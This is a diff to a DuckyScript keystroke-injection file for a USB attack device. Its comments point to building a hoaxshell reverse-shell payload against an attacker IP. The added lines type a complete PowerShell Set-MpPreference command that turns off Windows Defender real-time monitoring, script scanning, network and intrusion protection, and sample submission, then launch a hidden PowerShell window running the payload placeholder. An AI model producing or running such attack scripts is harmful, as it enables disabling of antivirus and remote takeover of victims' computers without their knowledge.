@@ -5,5 +5,12 @@ REM change you delay based on machine performance
 REM make your hoaxshell payload by command ./hoaxshell -s <IPADDRESS>
 GUI r
 DELAY 500
+STRING PowerShell.exe Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+DELAY 500
+ENTER
+DELAY 200
+GUI r
+DELAY 500
 STRING PowerShell.exe -WindowStyle hidden <PAYLAOD>
 DELAY 200
+ENTER
